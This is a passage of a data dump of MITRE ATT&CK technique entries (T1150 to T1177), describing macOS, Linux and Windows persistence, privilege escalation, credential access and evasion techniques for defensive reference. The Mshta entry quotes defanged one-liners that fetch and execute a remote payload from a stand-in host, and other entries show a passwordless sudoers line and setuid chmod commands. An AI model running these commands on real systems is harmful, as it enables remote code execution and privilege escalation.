           'categories': ['defense-evasion'],
           'description': 'As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the '
                          'binary’s entry point for execution. Previously, there were two headers to achieve this same '
                          'effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry '
                          'point for a binary can be hijacked so that initial execution flows to a malicious addition '
                          '(either another section or a code cave) and then goes back to the initial entry point so '
                          'that the victim doesn’t know anything was different  (Citation: Methods of Mac Malware '
                          'Persistence). By modifying a binary in this way, application whitelisting can be bypassed '
                          'because the file name or application path is still the same.',
           'name': 'LC_MAIN Hijacking',
           'platforms': ['macOS']},
 'T1150': {'attack_id': 'T1150',
           'categories': ['defense-evasion', 'persistence', 'privilege-escalation'],
           'description': 'Property list (plist) files contain all of the information that macOS and OS X uses to '
                          'configure applications and services. These files are UTF-8 encoded and formatted like XML '
                          'documents via a series of keys surrounded by < >. They detail when programs should execute, '
                          'file paths to the executables, program arguments, required OS permissions, and many others. '
                          'plists are located in certain locations depending on their purpose such as '
                          '<code>/Library/Preferences</code> (which execute with elevated privileges) and '
                          "<code>~/Library/Preferences</code> (which execute with a user's privileges). \n"
                          'Adversaries can modify these plist files to point to their own code, can use them to '
                          'execute their code in the context of another user, bypass whitelisting procedures, or even '
                          'use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)',
           'name': 'Plist Modification',
           'platforms': ['macOS']},
 'T1151': {'attack_id': 'T1151',
           'categories': ['defense-evasion', 'execution'],
           'description': "Adversaries can hide a program's true filetype by changing the extension of a file. With "
                          'certain file types (specifically this does not work with .app extensions), appending a '
                          'space to the end of a filename will change how the file is processed by the operating '
                          'system. For example, if there is a Mach-O executable file called evil.bin, when it is '
                          'double clicked by a user, it will launch Terminal.app and execute. If this file is renamed '
                          'to evil.txt, then when double clicked by a user, it will launch with the default text '
                          'editing application (not executing the binary). However, if the file is renamed to '
                          '"evil.txt " (note the space at the end), then when double clicked by a user, the true file '
                          'type is determined by the OS and handled appropriately and the binary will be executed '
                          '(Citation: Mac Backdoors are back). \n'
                          '\n'
                          'Adversaries can use this feature to trick users into double clicking benign-looking files '
                          'of any format and ultimately executing something malicious.',
           'name': 'Space after Filename',
           'platforms': ['Linux', 'macOS']},
 'T1152': {'attack_id': 'T1152',
           'categories': ['defense-evasion', 'execution', 'persistence'],
           'description': 'Launchctl controls the macOS launchd process which handles things like launch agents and '
                          'launch daemons, but can execute other commands or programs itself. Launchctl supports '
                          'taking subcommands on the command-line, interactively, or even redirected from standard '
                          'input. By loading or reloading launch agents or launch daemons, adversaries can install '
                          'persistence or execute changes they made  (Citation: Sofacy Komplex Trojan). Running a '
                          'command from launchctl is as simple as <code>launchctl submit -l <labelName> -- '
                          '/Path/to/thing/to/execute "arg" "arg" "arg"</code>. Loading, unloading, or reloading launch '
                          'agents or launch daemons can require elevated privileges. \n'
                          '\n'
                          'Adversaries can abuse this functionality to execute code or even bypass whitelisting if '
                          'launchctl is an allowed process.',
           'name': 'Launchctl',
           'platforms': ['macOS']},
 'T1153': {'attack_id': 'T1153',
           'categories': ['execution'],
           'description': 'The <code>source</code> command loads functions into the current shell or executes files in '
                          'the current context. This built-in command can be run in two different ways <code>source '
                          '/path/to/filename [arguments]</code> or <code>. /path/to/filename [arguments]</code>. Take '
                          'note of the space after the ".". Without a space, a new shell is created that runs the '
                          'program instead of running the program within the current context. This is often used to '
                          "make certain features or functions available to a shell or to update a specific shell's "
                          'environment. \n'
                          '\n'
                          'Adversaries can abuse this functionality to execute programs. The file executed with this '
                          'technique does not need to be marked executable beforehand.',
           'name': 'Source',
           'platforms': ['Linux', 'macOS']},
 'T1154': {'attack_id': 'T1154',
           'categories': ['execution', 'persistence'],
           'description': 'The <code>trap</code> command allows programs and shells to specify commands that will be '
                          'executed upon receiving interrupt signals. A common situation is a script allowing for '
                          'graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> '
                          'and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the '
                          'shell encounters specific interrupts either to gain execution or as a persistence '
                          "mechanism. Trap commands are of the following format <code>trap 'command list' "
                          'signals</code> where "command list" will be executed when "signals" are received.',
           'name': 'Trap',
           'platforms': ['Linux', 'macOS']},
 'T1155': {'attack_id': 'T1155',
           'categories': ['execution', 'lateral-movement'],
           'description': 'macOS and OS X applications send AppleEvent messages to each other for interprocess '
                          'communications (IPC). These messages can be easily scripted with AppleScript for local or '
                          'remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) '
                          'language scripts. A list of OSA languages installed on a system can be found by using the '
                          '<code>osalang</code> program.\n'
                          'AppleEvent messages can be sent independently or as part of a script. These events can '
                          'locate open windows, send keystrokes, and interact with almost any open application locally '
                          'or remotely. \n'
                          '\n'
                          'Adversaries can use this to interact with open SSH connection, move to remote machines, and '
                          'even present users with fake dialog boxes. These events cannot start applications remotely '
                          "(they can start them locally though), but can interact with applications if they're already "
                          'running remotely. Since this is a scripting language, it can be used to launch more common '
                          'techniques as well such as a reverse shell via python  (Citation: Macro Malware Targets '
                          'Macs). Scripts can be run from the command-line via <code>osascript /path/to/script</code> '
                          'or <code>osascript -e "script here"</code>.',
           'name': 'AppleScript',
           'platforms': ['macOS']},
 'T1156': {'attack_id': 'T1156',
           'categories': ['persistence'],
           'description': "<code>~/.bash_profile</code> and <code>~/.bashrc</code> are executed in a user's context "
                          'when a new shell opens or when a user logs in so that their environment is set correctly. '
                          '<code>~/.bash_profile</code> is executed for login shells and <code>~/.bashrc</code> is '
                          'executed for interactive non-login shells. This means that when a user logs in (via '
                          'username and password) to the console (either locally or remotely via something like SSH), '
                          '<code>~/.bash_profile</code> is executed before the initial command prompt is returned to '
                          'the user. After that, every time a new shell is opened, <code>~/.bashrc</code> is executed. '
                          'This allows users more fine grained control over when they want certain commands executed.\n'
                          '\n'
                          "Mac's Terminal.app is a little different in that it runs a login shell by default each time "
                          'a new terminal window is opened, thus calling <code>~/.bash_profile</code> each time '
                          'instead of <code>~/.bashrc</code>.\n'
                          '\n'
                          'These files are meant to be written to by the local user to configure their own '
                          'environment; however, adversaries can also insert code into these files to gain persistence '
                          'each time a user logs in or opens a new shell  (Citation: amnesia malware).',
           'name': '.bash_profile and .bashrc',
           'platforms': ['Linux', 'macOS']},
 'T1157': {'attack_id': 'T1157',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'macOS and OS X use a common method to look for required dynamic libraries (dylib) to load '
                          'into a program based on search paths. Adversaries can take advantage of ambiguous paths to '
                          'plant dylibs to gain privilege escalation or persistence.\n'
                          '\n'
                          'A common method is to see what dylibs an application uses, then plant a malicious version '
                          'with the same name higher up in the search path. This typically results in the dylib being '
                          'in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) '
                          '(Citation: Malware Persistence on OS X)\n'
                          '\n'
                          'If the program is configured to run at a higher privilege level than the current user, then '
                          'when the dylib is loaded into the application, the dylib will also run at that elevated '
                          'level. This can be used by adversaries as a privilege escalation technique.',
           'name': 'Dylib Hijacking',
           'platforms': ['macOS']},
 'T1158': {'attack_id': 'T1158',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'To prevent normal users from accidentally changing special files on a system, most '
                          'operating systems have the concept of a ‘hidden’ file. These files don’t show up when a '
                          'user browses the file system with a GUI or when using normal commands on the command line. '
                          'Users must explicitly ask to show the hidden files either via a series of Graphical User '
                          'Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and '
                          '<code>ls –a</code> for Linux and macOS).\n'
                          '\n'
                          'Adversaries can use this to their advantage to hide files and folders anywhere on the '
                          'system for persistence and evading a typical user or system analysis that does not '
                          'incorporate investigation of hidden files.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Users can mark specific files as hidden by using the attrib.exe binary. Simply do '
                          '<code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the “+s” '
                          'marks a file as a system file and the “+r” flag marks the file as read only. Like most '
                          'windows binaries, the attrib.exe binary provides the ability to apply these changes '
                          'recursively “/S”.\n'
                          '\n'
                          '### Linux/Mac\n'
                          '\n'
                          'Users can mark specific files as hidden simply by putting a “.” as the first character in '
                          'the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac '
                          'Malware). Files and folder that start with a period, ‘.’, are by default hidden from being '
                          'viewed in the Finder application and standard command-line utilities like “ls”. Users must '
                          'specifically change settings to have these files viewable. For command line usages, there '
                          'is typically a flag to see all files (including hidden ones). To view these files in the '
                          'Finder Application, the following command must be executed: <code>defaults write '
                          'com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in '
                          'Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).\n'
                          'Many applications create these hidden files and folders to store information so that it '
                          'doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder '
                          'that’s hidden and contains the user’s known hosts and keys.',
           'name': 'Hidden Files and Directories',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1159': {'attack_id': 'T1159',
           'categories': ['persistence'],
           'description': 'Per Apple’s developer documentation, when a user logs in, a per-user launchd process is '
                          'started which loads the parameters for each launch-on-demand user agent from the property '
                          'list (plist) files found in <code>/System/Library/LaunchAgents</code>, '
                          '<code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code> (Citation: '
                          'AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac '
                          'Malware). These launch agents have property list files which point to the executables that '
                          'will be launched (Citation: OSX.Dok Malware).\n'
                          ' \n'
                          'Adversaries may install a new launch agent that can be configured to execute at login by '
                          'using launchd or launchctl to load a plist into the appropriate directories  (Citation: '
                          'Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may '
                          'be disguised by using a name from a related operating system or benign software. Launch '
                          'Agents are created with user level privileges and are executed with the privileges of the '
                          'user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). '
                          'They can be set up to execute when a specific user logs in (in the specific user’s '
                          'directory structure) or when any user logs in (which requires administrator privileges).',
           'name': 'Launch Agent',
           'platforms': ['macOS']},
 'T1160': {'attack_id': 'T1160',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish '
                          'system initialization. This process loads the parameters for each launch-on-demand '
                          'system-level daemon from the property list (plist) files found in '
                          '<code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> '
                          '(Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files '
                          'which point to the executables that will be launched (Citation: Methods of Mac Malware '
                          'Persistence).\n'
                          ' \n'
                          'Adversaries may install a new launch daemon that can be configured to execute at startup by '
                          'using launchd or launchctl to load a plist into the appropriate directories (Citation: OSX '
                          'Malware Detection). The daemon name may be disguised by using a name from a related '
                          'operating system or benign software  (Citation: WireLurker). Launch Daemons may be created '
                          'with administrator privileges, but are executed under root privileges, so an adversary may '
                          'also use a service to escalate privileges from administrator to root.\n'
                          ' \n'
                          'The plist file permissions must be root:wheel, but the script or program that it points to '
                          'has no such requirement. So, it is possible for poor configurations to allow an adversary '
                          'to modify a current Launch Daemon’s executable and gain persistence or Privilege '
                          'Escalation.',
           'name': 'Launch Daemon',
           'platforms': ['macOS']},
 'T1161': {'attack_id': 'T1161',
           'categories': ['persistence'],
           'description': 'Mach-O binaries have a series of headers that are used to perform certain operations when a '
                          'binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which '
                          'dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the '
                          'compiled binary as long adjustments are made to the rest of the fields and dependencies '
                          '(Citation: Writing Bad Malware for OSX). There are tools available to perform these '
                          'changes. Any changes will invalidate digital signatures on binaries because the binary is '
                          'being modified. Adversaries can remediate this issue by simply removing the '
                          'LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time '
                          '(Citation: Malware Persistence on OS X).',
           'name': 'LC_LOAD_DYLIB Addition',
           'platforms': ['macOS']},
 'T1162': {'attack_id': 'T1162',
           'categories': ['persistence'],
           'description': 'MacOS provides the option to list specific applications to run when a user logs in. These '
                          "applications run under the logged in user's context, and will be started every time the "
                          'user logs in. Login items installed using the Service Management Framework are not visible '
                          'in the System Preferences and can only be removed by the application that created them '
                          '(Citation: Adding Login Items). Users have direct control over login items installed using '
                          'a shared file list which are also visible in System Preferences (Citation: Adding Login '
                          "Items). These login items are stored in the user's <code>~/Library/Preferences/</code> "
                          'directory in a plist file called <code>com.apple.loginitems.plist</code> (Citation: Methods '
                          'of Mac Malware Persistence). Some of these applications can open visible dialogs to the '
                          'user, but they don’t all have to since there is an option to ‘Hide’ the window. If an '
                          'adversary can register their own login item or modified an existing one, then they can use '
                          'it to execute their code for a persistence mechanism each time the user logs in (Citation: '
                          'Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <code> '
                          'SMLoginItemSetEnabled </code> can be used to set Login Items, but scripting languages like '
                          '[AppleScript](https://attack.mitre.org/techniques/T1155) can do this as well  (Citation: '
                          'Adding Login Items).',
           'name': 'Login Item',
           'platforms': ['macOS']},
 'T1163': {'attack_id': 'T1163',
           'categories': ['persistence'],
           'description': 'During the boot process, macOS executes <code>source /etc/rc.common</code>, which is a '
                          'shell script containing various utility functions. This file also defines routines for '
                          'processing command-line arguments and for gathering system settings, and is thus '
                          'recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In '
                          'macOS and OS X, this is now a deprecated technique in favor of launch agents and launch '
                          'daemons, but is currently still used.\n'
                          '\n'
                          'Adversaries can use the rc.common file as a way to hide code for persistence that will '
                          'execute on each reboot as the root user (Citation: Methods of Mac Malware Persistence).',
           'name': 'Rc.common',
           'platforms': ['macOS']},
 'T1164': {'attack_id': 'T1164',
           'categories': ['persistence'],
           'description': 'Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened '
                          'when a user reboots their machine. While this is usually done via a Graphical User '
                          'Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain '
                          'this information as well located at '
                          '<code>~/Library/Preferences/com.apple.loginwindow.plist</code> and '
                          '<code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code>. \n'
                          '\n'
                          'An adversary can modify one of these files directly to include a link to their malicious '
                          'executable to provide a persistence mechanism each time the user reboots their machine '
                          '(Citation: Methods of Mac Malware Persistence).',
           'name': 'Re-opened Applications',
           'platforms': ['macOS']},
 'T1165': {'attack_id': 'T1165',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Per Apple’s documentation, startup items execute during the final phase of the boot process '
                          'and contain shell scripts or other executable files along with configuration information '
                          'used by the system to determine the execution order for all startup items (Citation: '
                          'Startup Items). This is technically a deprecated version (superseded by Launch Daemons), '
                          'and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to '
                          'exist on the system by default, but does appear to exist by default on macOS Sierra. A '
                          'startup item is a directory whose executable and configuration property list (plist), '
                          '<code>StartupParameters.plist</code>, reside in the top-level directory. \n'
                          '\n'
                          'An adversary can create the appropriate folders/files in the StartupItems directory to '
                          'register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). '
                          'Additionally, since StartupItems run during the bootup phase of macOS, they will run as '
                          'root. If an adversary is able to modify an existing Startup Item, then they will be able to '
                          'Privilege Escalate as well.',
           'name': 'Startup Items',
           'platforms': ['macOS']},
 'T1166': {'attack_id': 'T1166',
           'categories': ['privilege-escalation', 'persistence'],
           'description': 'When the setuid or setgid bits are set on Linux or macOS for an application, this means '
                          'that the application will run with the privileges of the owning user or group respectively  '
                          '(Citation: setuid man page). Normally an application is run in the current user’s context, '
                          'regardless of which user or group owns the application. There are instances where programs '
                          'need to be executed in an elevated context to function properly, but the user running them '
                          'doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, '
                          'which must be done by root, any user can specify the setuid or setgid flag to be set for '
                          'their own applications. These bits are indicated with an "s" instead of an "x" when viewing '
                          "a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these "
                          'bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, '
                          '<code>chmod u+s [file]</code>.\n'
                          '\n'
                          'An adversary can take advantage of this to either do a shell escape or exploit a '
                          'vulnerability in an application with the setsuid or setgid bits to get code running in a '
                          'different user’s context. Additionally, adversaries can use this mechanism on their own '
                          "malware to make sure they're able to execute in elevated contexts in the future  (Citation: "
                          'OSX Keydnap malware).',
           'name': 'Setuid and Setgid',
           'platforms': ['Linux', 'macOS']},
 'T1167': {'attack_id': 'T1167',
           'categories': ['credential-access'],
           'description': 'In OS X prior to El Capitan, users with root access can read plaintext keychain passwords '
                          'of logged-in users because Apple’s keychain implementation allows these credentials to be '
                          'cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) '
                          '(Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon '
                          'password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a '
                          'set of keys and algorithms to encrypt the user’s password, but once the master key is '
                          'found, an attacker need only iterate over the other values to unlock the final password. '
                          '(Citation: OS X Keychain)\n'
                          '\n'
                          'If an adversary can obtain root access (allowing them to read securityd’s memory), then '
                          'they can scan through memory to find the correct sequence of keys in relatively few tries '
                          'to decrypt the user’s logon keychain. This provides the adversary with all the plaintext '
                          'passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X '
                          'Keychain) (Citation: OSX Keydnap malware)',
           'name': 'Securityd Memory',
           'platforms': ['macOS']},
 'T1168': {'attack_id': 'T1168',
           'categories': ['persistence', 'execution'],
           'description': 'On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and '
                          'periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: '
                          'Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike '
                          '[Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job '
                          'scheduling on Linux-based systems cannot be done remotely unless used in conjunction within '
                          'an established remote session, like secure shell (SSH).\n'
                          '\n'
                          '### cron\n'
                          '\n'
                          'System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, '
                          '<code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while '
                          'per-user cron jobs are installed using crontab with specifically formatted crontab files. '
                          '(Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.\n'
                          '\n'
                          'Those methods allow for commands or scripts to be executed at specific, periodic intervals '
                          'in the background without user interaction. An adversary may use job scheduling to execute '
                          'programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) '
                          '(Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) '
                          '(Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral '
                          'Movement, to gain root privileges, or to run a process under the context of a specific '
                          'account.\n'
                          '\n'
                          '### at\n'
                          '\n'
                          'The at program is another means on POSIX-based systems, including macOS and Linux, to '
                          'schedule a program or script job for execution at a later date and/or time, which could '
                          'also be used for the same purposes.\n'
                          '\n'
                          '### launchd\n'
                          '\n'
                          'Each launchd job is described by a different configuration property list (plist) file '
                          'similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch '
                          'Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called '
                          '<code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs '
                          'Scheduling Timed Jobs) This only works on macOS and OS X.',
           'name': 'Local Job Scheduling',
           'platforms': ['Linux', 'macOS']},
 'T1169': {'attack_id': 'T1169',
           'categories': ['privilege-escalation'],
           'description': 'The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands '
                          'and from which terminals. This also describes which commands users can run as other users '
                          'or groups. This provides the idea of least privilege such that users are running in their '
                          'lowest possible permissions for most of the time and only elevate to other users or '
                          'permissions as needed, typically by prompting for a password. However, the sudoers file can '
                          'also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) '
                          'NOPASSWD: ALL</code> (Citation: OSX.Dok Malware). \n'
                          '\n'
                          'Adversaries can take advantage of these configurations to execute commands as other users '
                          'or spawn processes with higher privileges. You must have elevated privileges to edit this '
                          'file though.',
           'name': 'Sudo',
           'platforms': ['Linux', 'macOS']},
 'T1170': {'attack_id': 'T1170',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the '
                          'file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are '
                          'standalone applications that execute using the same models and technologies of Internet '
                          'Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n'
                          '\n'
                          'Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or '
                          'VBScript through a trusted Windows utility. There are several examples of different types '
                          'of threats leveraging mshta.exe during initial compromise and for execution of code '
                          '(Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: '
                          'FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: '
                          'FireEye FIN7 April 2017) \n'
                          '\n'
                          'Files may be executed by mshta.exe through an inline script: <code>mshta '
                          'vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>\n'
                          '\n'
                          'They may also be executed directly from URLs: <code>mshta '
                          'http[:]//webserver/payload[.]hta</code>\n'
                          '\n'
                          'Mshta.exe can be used to bypass application whitelisting solutions that do not account for '
                          "its potential use. Since mshta.exe executes outside of the Internet Explorer's security "
                          'context, it also bypasses browser security settings. (Citation: GitHub SubTee The List)',
           'name': 'Mshta',
           'platforms': ['Windows']},
 'T1171': {'attack_id': 'T1171',
           'categories': ['credential-access'],
           'description': 'Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are '
                          'Microsoft Windows components that serve as alternate methods of host identification. LLMNR '
                          'is based upon the Domain Name System (DNS) format and allows hosts on the same local link '
                          'to perform name resolution for other hosts. NBT-NS identifies systems on a local network by '
                          'their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n'
                          '\n'
                          'Adversaries can spoof an authoritative source for name resolution on a victim network by '
                          'responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the '
                          'requested host, effectively poisoning the service so that the victims will communicate with '
                          'the adversary controlled system. If the requested host belongs to a resource that requires '
                          'identification/authentication, the username and NTLMv2 hash will then be sent to the '
                          'adversary controlled system. The adversary can then collect the hash information sent over '
                          'the wire through tools that monitor the ports for traffic or through [Network '
                          'Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through '
                          '[Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. '
                          'In some cases where an adversary has access to a system that is in the authentication path '
                          'between systems or when automated scans that use credentials attempt to authenticate to an '
                          'adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and '
                          'execute code against a target system. The relay step can happen in conjunction with '
                          'poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM '
                          'Relaying)(Citation: Secure Ideas SMB Relay)\n'
                          '\n'
                          'Several tools exist that can be used to poison name services within local networks such as '
                          'NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: '
                          'GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)',
           'name': 'LLMNR/NBT-NS Poisoning and Relay',
           'platforms': ['Windows']},
 'T1172': {'attack_id': 'T1172',
           'categories': ['command-and-control'],
           'description': 'Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and '
                          'other services which host multiple domains to obfuscate the intended destination of HTTPS '
                          'traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent '
                          'Communication through domain fronting 2015) The technique involves using different domain '
                          'names in the SNI field of the TLS header and the Host field of the HTTP header. If both '
                          'domains are served from the same CDN, then the CDN may route to the address specified in '
                          'the HTTP header after unwrapping the TLS header. A variation of the the technique, '
                          '"domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting '
                          'to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if '
                          'the blank SNI fields are ignored).\n'
                          '\n'
                          'For example, if domain-x and domain-y are customers of the same CDN, it is possible to '
                          'place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be '
                          'going to domain-x, however the CDN may route it to domain-y.',
           'name': 'Domain Fronting',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1173': {'attack_id': 'T1173',
           'categories': ['execution'],
           'description': 'Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or '
                          'continuous inter-process communication (IPC) between applications. Once a link is '
                          'established, applications can autonomously exchange transactions consisting of strings, '
                          'warm data links (notifications when a data item changes), hot data links (duplications of '
                          'changes to a data item), and requests for command execution.\n'
                          '\n'
                          'Object Linking and Embedding (OLE), or the ability to link data between documents, was '
                          'originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in '
                          'Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer '
                          'DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: '
                          'Microsoft DDE Advisory Nov 2017)\n'
                          '\n'
                          'Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be '
                          'poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE '
                          'Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and '
                          'used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of '
                          'Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) '
                          'DDE could also be leveraged by an adversary operating on a compromised machine who does not '
                          'have direct access to command line execution.',
           'name': 'Dynamic Data Exchange',
           'platforms': ['Windows']},
 'T1174': {'attack_id': 'T1174',
           'categories': ['credential-access'],
           'description': 'Windows password filters are password policy enforcement mechanisms for both domain and '
                          'local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a '
                          'method to validate potential passwords against password policies. Filter DLLs can be '
                          'positioned on local computers for local accounts and/or domain controllers for domain '
                          'accounts.\n'
                          '\n'
                          'Before registering new passwords in the Security Accounts Manager (SAM), the Local Security '
                          'Authority (LSA) requests validation from each registered filter. Any potential changes '
                          'cannot take effect until every registered filter acknowledges validation.\n'
                          '\n'
                          'Adversaries can register malicious password filters to harvest credentials from local '
                          'computers and/or entire domains. To perform proper validation, filters must receive '
                          'plain-text credentials from the LSA. A malicious password filter would receive these '
                          'plain-text credentials every time a password request is made. (Citation: Carnal Ownage '
                          'Password Filters Sept 2013)',
           'name': 'Password Filter DLL',
           'platforms': ['Windows']},
 'T1175': {'attack_id': 'T1175',
           'categories': ['lateral-movement'],
           'description': 'Windows Distributed Component Object Model (DCOM) is transparent middleware that extends '
                          'the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local '
                          'computer using remote procedure call (RPC) technology. COM is a component of the Windows '
                          'application programming interface (API) that enables interaction between software objects. '
                          'Through COM, a client object can call methods of server objects, which are typically '
                          'Dynamic Link Libraries (DLL) or executables (EXE).\n'
                          '\n'
                          'Permissions to interact with local and remote server COM objects are specified by access '
                          'control lists (ACL) in the Registry. (Citation: Microsoft COM ACL) (Citation: Microsoft '
                          'Process Wide Com Keys) (Citation: Microsoft System Wide Com Keys) By default, only '
                          'Administrators may remotely activate and launch COM objects through DCOM.\n'
                          '\n'
                          'Adversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the '
                          'context of an appropriately privileged user can remotely obtain arbitrary and even direct '
                          'shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral '
                          'Movement Nov 2017) as well as other Windows objects that contain insecure methods. '
                          '(Citation: Enigma MMC20 COM Jan 2017) (Citation: Enigma DCOM Lateral Movement Jan 2017) '
                          'DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) '
                          'and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) '
                          '(DDE) execution directly through a COM created instance of a Microsoft Office application '
                          '(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a '
                          'malicious document.\n'
                          '\n'
                          'DCOM may also expose functionalities that can be leveraged during other areas of the '
                          'adversary chain of activity such as Privilege Escalation and Persistence. (Citation: '
                          'ProjectZero File Write EoP Apr 2018)',
           'name': 'Distributed Component Object Model',
           'platforms': ['Windows']},
 'T1176': {'attack_id': 'T1176',
           'categories': ['persistence'],
           'description': 'Browser extensions or plugins are small programs that can add functionality and customize '
                          "aspects of internet browsers. They can be installed directly or through a browser's app "
                          'store. Extensions generally have access and permissions to everything that the browser can '
                          'access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)\n'
                          '\n'
                          'Malicious extensions can be installed into a browser through malicious app store downloads '
                          'masquerading as legitimate extensions, through social engineering, or by an adversary that '
                          'has already compromised a system. Security can be limited on browser app stores so may not '
                          'be difficult for malicious extensions to defeat automated scanners and be uploaded. '
                          '(Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can '
                          'browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: '
                          'ICEBRG Chrome Extensions) steal all information that a user enters into a browser, to '
                          'include credentials, (Citation: Banker Google Chrome Extension Steals Creds) (Citation: '
                          'Catch All Chrome Extension) and be used as an installer for a RAT for persistence. There '
                          'have been instances of botnets using a persistent backdoor through malicious Chrome '
                          'extensions. (Citation: Stantinko Botnet) There have also been similar examples of '
                          'extensions being used for command & control  (Citation: Chrome Extension C2 Malware).',
           'name': 'Browser Extensions',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1177': {'attack_id': 'T1177',
           'categories': ['execution', 'persistence'],
           'description': 'The Windows security subsystem is a set of components that manage and enforce the security '
